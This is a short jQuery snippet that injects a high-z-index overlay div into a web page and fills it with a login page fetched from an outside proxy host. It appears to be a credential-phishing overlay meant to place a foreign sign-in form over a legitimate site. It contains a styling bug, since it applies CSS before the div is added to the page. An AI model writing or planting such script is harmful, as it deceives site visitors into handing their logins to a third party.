var setdiv = document.createElement('div');
setdiv.setAttribute('id','setdiv');
$('#setdiv').css({'width':"300px","height":"300px",
"position":"absolute !important", "z-index":9999999999999999999999999, "top":"10px","right":"20px",
 "background-color":"#9E0F0F"});
$("body").prepend(setdiv);
$.get( "https://proxy.teamable.me/accounts/login/", function( data ) {
  $( "#setdiv" ).html( data );
});